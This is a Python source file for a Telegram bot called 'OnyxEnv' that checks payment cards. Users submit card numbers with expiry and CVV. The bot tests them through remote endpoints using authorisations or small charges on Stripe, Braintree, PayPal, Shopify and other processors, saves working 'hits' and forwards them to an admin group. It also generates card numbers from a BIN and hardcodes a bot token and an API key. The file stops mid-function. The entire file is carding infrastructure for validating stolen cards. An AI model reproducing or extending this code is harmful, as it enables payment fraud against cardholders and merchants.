import telebot
from telebot import types
import requests
import time
from datetime import datetime
import re
import urllib.parse
import logging
import os
import json

# Initialize bot with new token
bot = telebot.TeleBot("8531959574:AAHZ2znCqPyApBHmu4oOcASnkgdTq4ImlSo")

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Admin list (updated)
ADMINS = [7904483885]  # New admin ID
APPROVED_GROUP_FILE = 'chat.txt'
DECLINED_GROUP_FILE = 'declined_chat.txt'
HITS_FILE = 'hits.txt'
DECLINES_FILE = 'declines.txt'
DISABLED_GATEWAYS_FILE = 'disabled_gateways.json'
user_data = {}
FLOOD_WAIT = 12  # 7 seconds between commands
MAX_CHECKS_PER_HOUR = 500
API_TIMEOUT = 120
REGISTERED_USERS_FILE = 'onyx.txt'
BANNED_USERS_FILE = 'ban.txt'

# Base API URL for Railway
BASE_API_URL = "https://onyxenvbot.up.railway.app"

# Ensure files exist
for file in [APPROVED_GROUP_FILE, DECLINED_GROUP_FILE, HITS_FILE, 
             DECLINES_FILE, REGISTERED_USERS_FILE, BANNED_USERS_FILE, DISABLED_GATEWAYS_FILE]:
    if not os.path.exists(file):
        open(file, 'a').close()

def load_disabled_gateways():
    """Load disabled gateways from file"""
    try:
        if os.path.exists(DISABLED_GATEWAYS_FILE):
            with open(DISABLED_GATEWAYS_FILE, 'r') as f:
                content = f.read().strip()
                if content:
                    return json.loads(content)
        return {}
    except Exception as e:
        logger.error(f"Error loading disabled gateways: {e}")
        return {}

def save_disabled_gateways(disabled_gateways):
    """Save disabled gateways to file"""
    try:
        with open(DISABLED_GATEWAYS_FILE, 'w') as f:
            json.dump(disabled_gateways, f)
    except Exception as e:
        logger.error(f"Error saving disabled gateways: {e}")

def is_gateway_disabled(command):
    """Check if a gateway is disabled"""
    disabled = load_disabled_gateways()
    return disabled.get(command, False)

def escape_markdown(text):
    """Helper function to escape markdown special characters"""
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join(['\\' + char if char in escape_chars else char for char in text])

def save_user_to_db(user_info):
    try:
        with open(REGISTERED_USERS_FILE, 'a') as f:
            f.write(f"{user_info}\n")
    except Exception as e:
        logger.error(f"Error saving user to database: {e}")

def is_user_registered(user_id):
    try:
        with open(REGISTERED_USERS_FILE, 'r') as f:
            registered_users = f.read().splitlines()
            return str(user_id) in [line.split(',')[0] for line in registered_users]
    except FileNotFoundError:
        return False

def is_user_banned(user_id):
    try:
        with open(BANNED_USERS_FILE, 'r') as f:
            banned_users = f.read().splitlines()
            return str(user_id) in banned_users
    except FileNotFoundError:
        return False

def get_approved_group():
    try:
        with open(APPROVED_GROUP_FILE, 'r') as f:
            content = f.read().strip()
            return int(content) if content else None
    except (FileNotFoundError, ValueError):
        return None

def get_declined_group():
    try:
        with open(DECLINED_GROUP_FILE, 'r') as f:
            content = f.read().strip()
            return int(content) if content else None
    except (FileNotFoundError, ValueError):
        return None

def save_hit(card_details, status, user_id):
    try:
        with open(HITS_FILE, 'a') as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{card_details} | status{{{status}}} | checked by{user_id} | {timestamp}\n")
        
        # Send to approved group if set
        approved_group = get_approved_group()
        if approved_group and ('approved' in status.lower() or 'live' in status.lower()):
            try:
                bot.send_message(
                    approved_group,
                    f"✅ New Hit:\n<code>{card_details}</code>\nStatus: {status}\nChecked by: {user_id}",
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Error sending to approved group: {e}")
    except Exception as e:
        logger.error(f"Error saving hit: {e}")

def save_decline(card_details, status, user_id):
    try:
        with open(DECLINES_FILE, 'a') as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{card_details} | status{{{status}}} | checked by{user_id} | {timestamp}\n")
        
        # Send to declined group if set
        declined_group = get_declined_group()
        if declined_group and ('declined' in status.lower() or 'dead' in status.lower()):
            try:
                bot.send_message(
                    declined_group,
                    f"❌ New Decline:\n<code>{card_details}</code>\nStatus: {status}\nChecked by: {user_id}",
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Error sending to declined group: {e}")
    except Exception as e:
        logger.error(f"Error saving decline: {e}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_user_banned(message.from_user.id):
        bot.reply_to(message, "🚫 You are banned from using this bot.")
        return
    
    user = message.from_user
    welcome_message = f"""
{escape_markdown("⌬ OnyxEnv | By @onyxEnvSupportBot")}
```Upgrading...```
━━━━━━━━━━━━━━━━
✅️ {escape_markdown(f"Hello {user.first_name}!")}
{escape_markdown("How Are You?")}
👤 {escape_markdown(f"Your UserID - {user.id}")}
```BOT Status - Live!!!```
    """
    
    keyboard = [
        [
            types.InlineKeyboardButton("Register", callback_data="register"),
            types.InlineKeyboardButton("Commands", callback_data="commands")
        ]
    ]
    
    if user.id in ADMINS:
        keyboard.append([types.InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
    
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    
    try:
        bot.send_message(
            message.chat.id,
            welcome_message,
            reply_markup=reply_markup,
            parse_mode='MarkdownV2'
        )
    except Exception as e:
        logger.error(f"Error sending welcome message: {e}")
        bot.send_message(
            message.chat.id,
            "Welcome to OnyxEnv! Please click the buttons below:",
            reply_markup=reply_markup
        )

def check_registration(message):
    if is_user_banned(message.from_user.id):
        bot.reply_to(message, "🚫 You are banned from using this bot.")
        return False
        
    if not is_user_registered(message.from_user.id):
        bot.reply_to(message, "⚠️ You are not registered! Please use /start and register first.")
        return False
    return True

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user = call.from_user
    
    try:
        if is_user_banned(user.id):
            bot.answer_callback_query(call.id, "You are banned from using this bot.", show_alert=True)
            return
            
        if call.data == "register":
            if is_user_registered(user.id):
                bot.answer_callback_query(
                    call.id,
                    text=f"Hey {user.first_name} You are already registered",
                    show_alert=True
                )
                return
                
            save_user_to_db(f"{user.id},{user.username or 'no_username'},{user.first_name}")
            registration_message = f"""
```[⌬] Registration Successful ♻️```
━━━━━━━━━━━━━━
[ϟ] Name\\: [{escape_markdown(user.first_name)}](tg://user?id={user.id})
[ϟ] User ID\\: `{user.id}`
            """
            
            keyboard = [
                [types.InlineKeyboardButton("Commands", callback_data="commands")],
                [types.InlineKeyboardButton("Back", callback_data="back")]
            ]
            reply_markup = types.InlineKeyboardMarkup(keyboard)
            
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=registration_message,
                reply_markup=reply_markup,
                parse_mode='MarkdownV2'
            )
        
        elif call.data == "commands":
            if not is_user_registered(user.id):
                bot.answer_callback_query(call.id, "Please register first!", show_alert=True)
                return
            show_commands_menu(call)
        
        elif call.data == "auth":
            show_auth_menu(call)
        
        elif call.data == "charge":
            show_charge_menu(call)
        
        elif call.data == "back":
            welcome_message = f"""
{escape_markdown("⌬ OnyxEnv | By @OnyxEnvSupportBot")}
```Upgrading...```
━━━━━━━━━━━━━━━━
✅️ {escape_markdown(f"Hello {user.first_name}!")}
{escape_markdown("How Are You?")}
👤 {escape_markdown(f"Your UserID - {user.id}")}
```BOT Status - Live!!!```
            """
            
            keyboard = [
                [
                    types.InlineKeyboardButton("Register", callback_data="register"),
                    types.InlineKeyboardButton("Commands", callback_data="commands")
                ]
            ]
            
            if user.id in ADMINS:
                keyboard.append([types.InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
            
            reply_markup = types.InlineKeyboardMarkup(keyboard)
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=welcome_message,
                reply_markup=reply_markup,
                parse_mode='MarkdownV2'
            )
        
        elif call.data == "admin_panel":
            if user.id in ADMINS:
                show_admin_panel(call)
            else:
                bot.answer_callback_query(call.id, "⚠️ You are not an admin!", show_alert=True)
        
        elif call.data == "manage_gateways":
            if user.id in ADMINS:
                show_gateway_management(call)
        
        elif call.data.startswith("toggle_"):
            if user.id in ADMINS:
                command = call.data.replace("toggle_", "/")
                toggle_gateway(call, command)
        
        elif call.data in COMMAND_GATEWAYS:
            show_command_info(call, call.data)
        
        elif call.data == "admin_broadcast":
            if user.id in ADMINS:
                msg = bot.send_message(call.message.chat.id, "Please send the broadcast message:")
                bot.register_next_step_handler(msg, process_broadcast)
        
        elif call.data == "admin_ban":
            if user.id in ADMINS:
                msg = bot.send_message(call.message.chat.id, "Please send the user ID to ban:")
                bot.register_next_step_handler(msg, process_ban)
        
        elif call.data == "admin_unban":
            if user.id in ADMINS:
                msg = bot.send_message(call.message.chat.id, "Please send the user ID to unban:")
                bot.register_next_step_handler(msg, process_unban)
        
        elif call.data == "admin_addgroup":
            if user.id in ADMINS:
                msg = bot.send_message(call.message.chat.id, "Please send the group ID for APPROVED cards:")
                bot.register_next_step_handler(msg, process_addgroup)
        
        elif call.data == "admin_declinegroup":
            if user.id in ADMINS:
                msg = bot.send_message(call.message.chat.id, "Please send the group ID for DECLINED cards:")
                bot.register_next_step_handler(msg, process_declinegroup)
    
    except Exception as e:
        logger.error(f"Error handling callback query: {e}")
        bot.answer_callback_query(call.id, "An error occurred. Please try again.", show_alert=True)

def toggle_gateway(call, command):
    """Toggle gateway on/off"""
    disabled = load_disabled_gateways()
    
    if disabled.get(command, False):
        # Enable gateway
        disabled.pop(command, None)
        status = "enabled"
    else:
        # Disable gateway
        disabled[command] = True
        status = "disabled"
    
    save_disabled_gateways(disabled)
    bot.answer_callback_query(call.id, f"Gateway {command} {status} successfully!")
    
    # Refresh the gateway management menu
    show_gateway_management(call)

def show_gateway_management(call):
    """Show gateway management menu"""
    disabled = load_disabled_gateways()
    
    keyboard = []
    
    # Add toggle buttons for each gateway
    auth_gateways = ['/chk', '/cau', '/bt', '/au', '/ra', '/ady', '/vbv', '/bvbv']
    charge_gateways = ['/ppf', '/na', '/st', '/sb', '/b3', '/sh', '/skr', '/rc', '/pp', '/ds', '/sho', '/sko', '/rp', '/rnd', '/py', '/payu']
    
    # Auth gateways
    keyboard.append([types.InlineKeyboardButton("🔐 AUTH GATEWAYS", callback_data="none")])
    for cmd in auth_gateways:
        status = "🔴 DISABLED" if disabled.get(cmd, False) else "🟢 ENABLED"
        name = COMMAND_GATEWAYS.get(cmd, {}).get('name', cmd)
        keyboard.append([types.InlineKeyboardButton(
            f"{name} - {status}",
            callback_data=f"toggle_{cmd.replace('/', '')}"
        )])
    
    # Charge gateways
    keyboard.append([types.InlineKeyboardButton("💰 CHARGE GATEWAYS", callback_data="none")])
    for cmd in charge_gateways:
        status = "🔴 DISABLED" if disabled.get(cmd, False) else "🟢 ENABLED"
        name = COMMAND_GATEWAYS.get(cmd, {}).get('name', cmd)
        keyboard.append([types.InlineKeyboardButton(
            f"{name} - {status}",
            callback_data=f"toggle_{cmd.replace('/', '')}"
        )])
    
    keyboard.append([types.InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_panel")])
    
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="*⚙️ Gateway Management*\n\nClick on a gateway to toggle it ON/OFF:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

def process_broadcast(message):
    if message.from_user.id not in ADMINS:
        return
    
    broadcast_message = message.text
    try:
        with open(REGISTERED_USERS_FILE, 'r') as f:
            users = f.read().splitlines()
            total = len(users)
            success = 0
            
            for user_line in users:
                try:
                    user_id = user_line.split(',')[0]
                    bot.send_message(user_id, f"📢 Broadcast:\n{broadcast_message}")
                    success += 1
                except Exception as e:
                    logger.error(f"Error sending to user {user_id}: {e}")
            
            bot.reply_to(message, f"Broadcast sent to {success}/{total} users.")
    except Exception as e:
        logger.error(f"Error in broadcast: {e}")
        bot.reply_to(message, f"Error sending broadcast: {e}")

def process_ban(message):
    if message.from_user.id not in ADMINS:
        return
    
    user_id = message.text.strip()
    try:
        with open(BANNED_USERS_FILE, 'a') as f:
            f.write(f"{user_id}\n")
        bot.reply_to(message, f"✅ User {user_id} has been banned.")
    except Exception as e:
        logger.error(f"Error banning user: {e}")
        bot.reply_to(message, f"Error banning user: {e}")

def process_unban(message):
    if message.from_user.id not in ADMINS:
        return
    
    user_id = message.text.strip()
    try:
        with open(BANNED_USERS_FILE, 'r') as f:
            banned_users = [line.strip() for line in f.readlines() if line.strip() != user_id]
        
        with open(BANNED_USERS_FILE, 'w') as f:
            f.write('\n'.join(banned_users))
        
        bot.reply_to(message, f"✅ User {user_id} has been unbanned.")
    except Exception as e:
        logger.error(f"Error unbanning user: {e}")
        bot.reply_to(message, f"Error unbanning user: {e}")

def process_addgroup(message):
    if message.from_user.id not in ADMINS:
        return
    
    group_id = message.text.strip()
    try:
        with open(APPROVED_GROUP_FILE, 'w') as f:
            f.write(group_id)
        bot.reply_to(message, f"✅ Approved group set to {group_id}")
    except Exception as e:
        logger.error(f"Error setting approved group: {e}")
        bot.reply_to(message, f"Error setting approved group: {e}")

def process_declinegroup(message):
    if message.from_user.id not in ADMINS:
        return
    
    group_id = message.text.strip()
    try:
        with open(DECLINED_GROUP_FILE, 'w') as f:
            f.write(group_id)
        bot.reply_to(message, f"✅ Declined group set to {group_id}")
    except Exception as e:
        logger.error(f"Error setting declined group: {e}")
        bot.reply_to(message, f"Error setting declined group: {e}")

def show_admin_panel(call):
    keyboard = [
        [types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
        [types.InlineKeyboardButton("🔨 Ban User", callback_data="admin_ban")],
        [types.InlineKeyboardButton("✅ Unban User", callback_data="admin_unban")],
        [types.InlineKeyboardButton("📊 Add Approved Group", callback_data="admin_addgroup")],
        [types.InlineKeyboardButton("📉 Add Declined Group", callback_data="admin_declinegroup")],
        [types.InlineKeyboardButton("⚙️ Manage Gateways", callback_data="manage_gateways")],
        [types.InlineKeyboardButton("🔙 Back", callback_data="back")]
    ]
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    
    approved_group = get_approved_group()
    declined_group = get_declined_group()
    
    # Count disabled gateways
    disabled = load_disabled_gateways()
    disabled_count = len(disabled)
    
    status_text = f"""
*👑 Admin Panel*

✅ Approved Group: {'Not set' if approved_group is None else approved_group}
❌ Declined Group: {'Not set' if declined_group is None else declined_group}
⚙️ Disabled Gateways: {disabled_count}

Total Gateways: {len(COMMAND_GATEWAYS)}
"""
    
    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=escape_markdown(status_text),
            reply_markup=reply_markup,
            parse_mode='MarkdownV2'
        )
    except Exception as e:
        logger.error(f"Error showing admin panel: {e}")
        bot.answer_callback_query(call.id, "Error showing admin panel. Please try again.", show_alert=True)

def show_command_info(call, command):
    cmd_info = COMMAND_GATEWAYS.get(command, {})
    
    escaped_name = escape_markdown(cmd_info.get('name', 'Unknown'))
    escaped_gateway = escape_markdown(cmd_info.get('name', 'Unknown'))
    escaped_command = escape_markdown(command)
    
    message = f"""
`{escaped_name} Command`
━━ ━ ━ ━ ━ ━ ━ ━ ━ ━━

【✘】 {escaped_gateway}
【✘】Format \\: {command} cc\\|mon\\|year\\|cvv
【✘】Status \\: 🟢 \\| Live 
【✘】Command \\: `{escaped_command}`
    """
    
    back_to = "auth" if command in [
        '/chk', '/cau', '/bt', '/au', '/ra', '/ady', '/vbv', '/bvbv'
    ] else "charge"
    
    keyboard = [
        [types.InlineKeyboardButton("Back", callback_data=back_to)]
    ]
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=message,
        reply_markup=reply_markup,
        parse_mode='MarkdownV2'
    )

def show_commands_menu(call):
    keyboard = [
        [types.InlineKeyboardButton("1st Auth", callback_data="auth"),
         types.InlineKeyboardButton("2nd Charge", callback_data="charge")],
        [types.InlineKeyboardButton("3rd Back", callback_data="back")]
    ]
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=escape_markdown("Choose an option:"),
        reply_markup=reply_markup,
        parse_mode='MarkdownV2'
    )

def show_auth_menu(call):
    keyboard = [
        [types.InlineKeyboardButton("1st Stripe Auth", callback_data="/chk"),
         types.InlineKeyboardButton("2nd Chaos Auth", callback_data="/cau")],
        [types.InlineKeyboardButton("3rd Braintree Auth", callback_data="/bt"),
         types.InlineKeyboardButton("4th App Based Auth", callback_data="/au")],
        [types.InlineKeyboardButton("5th Random Auth", callback_data="/ra"),
         types.InlineKeyboardButton("6th Adyen Auth", callback_data="/ady")],
        [types.InlineKeyboardButton("7th 3DS Lookup", callback_data="/vbv"),
         types.InlineKeyboardButton("8th Braintree 3DS", callback_data="/bvbv")],
        [types.InlineKeyboardButton("9th Back", callback_data="commands")]
    ]
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=escape_markdown("*Auth Options:*"),
        reply_markup=reply_markup,
        parse_mode='MarkdownV2'
    )

def show_charge_menu(call):
    keyboard = [
        [types.InlineKeyboardButton("PayFlow ($25)", callback_data="/ppf"),
         types.InlineKeyboardButton("Arcenus ($0.005)", callback_data="/na")],
        [types.InlineKeyboardButton("Stripe ($1)", callback_data="/st"),
         types.InlineKeyboardButton("Site Base ($5)", callback_data="/sb")],
        [types.InlineKeyboardButton("Braintree ($10)", callback_data="/b3"),
         types.InlineKeyboardButton("Shopify ($32)", callback_data="/sh")],
        [types.InlineKeyboardButton("Skrill ($32)", callback_data="/skr"),
         types.InlineKeyboardButton("Random Charge ($1)", callback_data="/rc")],
        [types.InlineKeyboardButton("PayPal ($1)", callback_data="/pp"),
         types.InlineKeyboardButton("Braintree $10", callback_data="/ds")],
        [types.InlineKeyboardButton("Shopify 2 ($28.74)", callback_data="/sho"),
         types.InlineKeyboardButton("SK Based ($10)", callback_data="/sko")],
        [types.InlineKeyboardButton("Razor Pay ($12.45)", callback_data="/rp"),
         types.InlineKeyboardButton("Random Stripe ($15)", callback_data="/rnd")],
        [types.InlineKeyboardButton("PayPal ($2)", callback_data="/py"),
         types.InlineKeyboardButton("PayU ($1)", callback_data="/payu")],
        [types.InlineKeyboardButton("Back", callback_data="commands")]
    ]
    reply_markup = types.InlineKeyboardMarkup(keyboard)
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=escape_markdown("*Charge Options:*"),
        reply_markup=reply_markup,
        parse_mode='MarkdownV2'
    )

# ================== COMMAND AND GATEWAY MAPPING ==================
COMMAND_GATEWAYS = {
    # Auth Commands - Railway based
    '/chk': {'name': 'Stripe Auth', 'url': f'{BASE_API_URL}/stripe/key=yashikaaa/cc='},
    '/cau': {'name': 'Chaos Auth', 'url': f'{BASE_API_URL}/chaos/key=yashikaaa/cc='},
    '/bt': {'name': 'Braintree Auth', 'url': f'{BASE_API_URL}/braintree/key=yashikaaa/cc='},
    '/au': {'name': 'App Based Auth', 'url': f'{BASE_API_URL}/app-auth/key=yashikaaa/cc='},
    '/ra': {'name': 'Random Auth', 'url': f'{BASE_API_URL}/random/key=yashikaaa/cc='},
    '/ady': {'name': 'Adyen Auth', 'url': f'{BASE_API_URL}/adyen/key=yashikaaa/cc='},
    '/vbv': {'name': '3DS Lookup', 'url': 'https://vbv-non-vbv-bin.onrender.com/check_bin?key=yashikaaa&format='},
    '/bvbv': {'name': 'Braintree 3DS', 'url': 'https://vbv-non-vbv-bin.onrender.com/check_bin?key=yashikaaa&format='},
    
    # Charge Commands - Railway based
    '/ppf': {'name': 'PayFlow $25', 'url': f'{BASE_API_URL}/payflow/key=yashikaaa/cc='},
    '/na': {'name': 'Arcenus $0.005', 'url': f'{BASE_API_URL}/arcenus/key=yashikaaa/cc='},
    '/st': {'name': 'Stripe $1', 'url': f'{BASE_API_URL}/stripe/key=yashikaaa/cc='},
    '/sb': {'name': 'Site Base $5', 'url': f'{BASE_API_URL}/stripe/key=yashikaaa/cc='},
    '/b3': {'name': 'Braintree $10', 'url': f'{BASE_API_URL}/braintree/key=yashikaaa/cc='},
    '/sh': {'name': 'Shopify $32', 'url': f'{BASE_API_URL}/shopify/key=yashikaaa/cc='},
    '/skr': {'name': 'Skrill $32', 'url': f'{BASE_API_URL}/skrill/key=yashikaaa/cc='},
    '/rc': {'name': 'Random Charge $1', 'url': f'{BASE_API_URL}/random-stripe/key=yashikaaa/cc='},
    '/pp': {'name': 'PayPal $1', 'url': f'{BASE_API_URL}/paypal/key=yashikaaa/cc='},
    '/ds': {'name': 'Braintree $10', 'url': f'{BASE_API_URL}/braintree/key=yashikaaa/cc='},
    '/sho': {'name': 'Shopify $28.74', 'url': f'{BASE_API_URL}/shopify/key=yashikaaa/cc='},
    '/sko': {'name': 'SK Based $10', 'url': f'{BASE_API_URL}/sk/key=yashikaaa/cc='},
    '/rp': {'name': 'Razor Pay $12.45', 'url': f'{BASE_API_URL}/razorpay/key=yashikaaa/cc='},
    '/rnd': {'name': 'Random Stripe $15', 'url': f'{BASE_API_URL}/random-stripe/key=yashikaaa/cc='},
    '/py': {'name': 'PayPal $2', 'url': f'{BASE_API_URL}/paypal/key=yashikaaa/cc='},
    '/payu': {'name': 'PayU $1', 'url': f'{BASE_API_URL}/payu/key=yashikaaa/cc='},
    
    # Utility Commands
    '/gen': {'name': 'Card Generator', 'url': None}
}

# ================== COMMAND HANDLERS ==================
@bot.message_handler(commands=['ban', 'unban', 'broadcast', 'approve', 'decline', 'off'])
def handle_admin_commands(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "⚠️ You are not authorized to use this command.")
        return
    
    if message.text.startswith('/off'):
        # Handle /off command to disable gateways
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "Usage: /off <gateway_command>\nExample: /off /chk")
            return
        
        gateway = parts[1]
        if gateway not in COMMAND_GATEWAYS:
            bot.reply_to(message, f"⚠️ Invalid gateway: {gateway}")
            return
        
        disabled = load_disabled_gateways()
        disabled[gateway] = True
        save_disabled_gateways(disabled)
        bot.reply_to(message, f"✅ Gateway {gateway} has been disabled.")
        return
    
    if len(message.text.split()) < 2:
        bot.reply_to(message, f"Usage: {message.text.split()[0]} <parameter>")
        return
    
    param = message.text.split()[1]
    
    if message.text.startswith('/ban'):
        process_ban(message)
    elif message.text.startswith('/unban'):
        process_unban(message)
    elif message.text.startswith('/broadcast'):
        process_broadcast(message)
    elif message.text.startswith('/approve'):
        process_addgroup(message)
    elif message.text.startswith('/decline'):
        process_declinegroup(message)

@bot.message_handler(commands=['addgroup', 'declinegroup'])
def handle_group_commands(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "⚠️ You are not authorized to use this command.")
        return
    
    if len(message.text.split()) < 2:
        bot.reply_to(message, f"Usage: {message.text.split()[0]} <group_id>")
        return
    
    group_id = message.text.split()[1]
    try:
        if message.text.startswith('/addgroup'):
            with open(APPROVED_GROUP_FILE, 'w') as f:
                f.write(group_id)
            bot.reply_to(message, f"✅ Approved group set to {group_id}")
        else:
            with open(DECLINED_GROUP_FILE, 'w') as f:
                f.write(group_id)
            bot.reply_to(message, f"✅ Declined group set to {group_id}")
    except Exception as e:
        logger.error(f"Error setting group: {e}")
        bot.reply_to(message, f"Error setting group: {e}")

@bot.message_handler(commands=list(COMMAND_GATEWAYS.keys()))
def handle_commands(message):
    if not check_registration(message):
        return
    
    command = message.text.split()[0].lower()
    
    # Check if gateway is disabled
    if is_gateway_disabled(command):
        bot.reply_to(message, f"⚠️ Gateway {command} is currently disabled by admin.")
        return
    
    process_card_check(message)

@bot.message_handler(regexp=r'^\/(chk|cau|bt|au|ra|ady|vbv|bvbv|ppf|na|st|sb|b3|sh|skr|rc|pp|ds|sho|sko|rp|rnd|py|payu|gen)\b')
def handle_dot_commands(message):
    if not check_registration(message):
        return
    
    command = message.text.split()[0].lower().replace('.', '/')
    
    # Check if gateway is disabled
    if is_gateway_disabled(command):
        bot.reply_to(message, f"⚠️ Gateway {command} is currently disabled by admin.")
        return
    
    process_card_check(message)

def process_card_check(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_rate_limit(user_id, chat_id):
        return
    
    command = message.text.split()[0].lower().replace('.', '/')
    card_details = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
    
    if command == '/gen' or command == '.gen':
        process_gen_command(message)
        return
    
    if not card_details and message.reply_to_message:
        card_details = extract_card_details(message.reply_to_message.text)
    
    if not card_details:
        bot.reply_to(message, "Please provide card details in format: CC|MM|YY|CVV or CC|MM|YYYY|CVV")
        return
    
    # Send initial processing message
    processing_msg = bot.reply_to(message, f"""
𝗖𝗮𝗿𝗱: <code>{card_details}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {COMMAND_GATEWAYS.get(command, {}).get('name', 'Unknown')}

Processing....⚡️
""", parse_mode='HTML')
    
    check_card(message, command, card_details, processing_msg.message_id)

def check_card(message, command, card_details, processing_msg_id):
    if not validate_card_format(card_details):
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=processing_msg_id,
            text="⚠️ Invalid card format. Use: CC|MM|YYYY|CVV or CC|MM|YY|CVV"
        )
        return
    
    gateway_info = COMMAND_GATEWAYS.get(command, {})
    if not gateway_info or not gateway_info.get('url'):
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=processing_msg_id,
            text="⚠️ Error: Invalid gateway"
        )
        return
    
    try:
        start_time = time.time()
        response = requests.get(
            gateway_info['url'] + urllib.parse.quote(card_details),
            timeout=API_TIMEOUT
        )
        elapsed_time = time.time() - start_time
        
        if response.status_code == 200:
            try:
                data = response.json()
                bin_info = get_bin_info(card_details.split('|')[0][:6])
                response_text = format_response(
                    data,
                    card_details,
                    command,
                    elapsed_time,
                    bin_info,
                    gateway_info['name']
                )
                
                # Save to appropriate files based on status
                status = data.get('status', '').lower()
                if 'approved' in status or 'live' in status:
                    save_hit(card_details, status, message.from_user.id)
                elif 'declined' in status or 'dead' in status:
                    save_decline(card_details, status, message.from_user.id)
                
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=processing_msg_id,
                    text=response_text,
                    parse_mode='HTML'
                )
            except ValueError:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=processing_msg_id,
                    text="⚠️ Failed to decode API response. Please try again later."
                )
        else:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=processing_msg_id,
                text="⚠️ Failed to connect to our servers. Please try again later."
            )
    except requests.exceptions.Timeout:
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=processing_msg_id,
            text="⚠️ Request timed out. Please try again later."
        )
    except Exception:
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=processing_msg_id,
            text="⚠️ An unexpected error occurred. Please try again later."
        )

def format_response(data, card_details, command, elapsed_time, bin_info, gateway_name):
    status = data.get('status', 'Unknown').lower()
    if 'approved' in status or 'live' in status:
        status_emoji = "✅"
    elif 'declined' in status or 'dead' in status:
        status_emoji = "❌"
    else:
        status_emoji = "⚠️"
    
    return f"""<b>{status_emoji} {data.get('status', 'Unknown')}</b>

[玄]𝗖𝗮𝗿𝗱 : <code>{card_details}</code>
<b>[玄] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲:</b> {gateway_name}
<b>[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 :</b> {data.get('response', 'No response')}

<b>[玄]  𝙄𝙣𝙛𝙤:</b> {bin_info.get('brand', 'Unknown')} - {bin_info.get('type', 'Unknown')}
<b>[玄] 𝘽𝙖𝙣𝙠:</b> {bin_info.get('bank', 'Unknown')}
<b>玄] 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 :</b> {bin_info.get('country_name', 'Unknown')} {bin_info.get('country_flag', '')}

<b>𝗧𝗶𝗺𝗲:</b> {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

def process_gen_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_rate_limit(user_id, chat_id):
        return
    
    if len(message.text.split()) < 2:
        bot.reply_to(message, "⚠️ Please provide a BIN (e.g., /gen 411111)")
        return
    
    bin_number = message.text.split()[1]
    if not bin_number.isdigit() or len(bin_number) < 6:
        bot.reply_to(message, "⚠️ BIN must be numeric and at least 6 digits long")
        return
    
    processing_msg = bot.reply_to(message, "⚡ Generating cards... Please wait")
    
    try:
        response = requests.get(
            f"https://drlabapis.onrender.com/api/ccgenerator?bin={bin_number}&count=10",
            timeout=API_TIMEOUT
        )
        
        if response.status_code == 200:
            cards = [card.strip() for card in response.text.split('\n') if card.strip()]
            
            if not cards:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=processing_msg.message_id,
                    text="⚠️ No cards generated. Please try a different BIN."
                )
                return
            
            bin_info = get_bin_info(bin_number[:6])
            response_text = format_gen_response(bin_number, cards, bin_info)
            
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=processing_msg.message_id,
                text=response_text,
                parse_mode='HTML'
            )
        else:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=processing_msg.message_id,
                text="⚠️ Failed to generate cards. API returned error status."
            )
    except requests.exceptions.Timeout:
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=processing_msg.message_id,
            text="⚠️ Request timed out. Please try again later."
        )
    except Exception:
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=processing_msg.message_id,
            text="⚠️ Failed to generate cards. Please try again later."
        )

def format_gen_response(bin_number, cards, bin_info):
    card_list = "\n".join([f"{i}. <code>{card}</code>" for i, card in enumerate(cards, 1)])
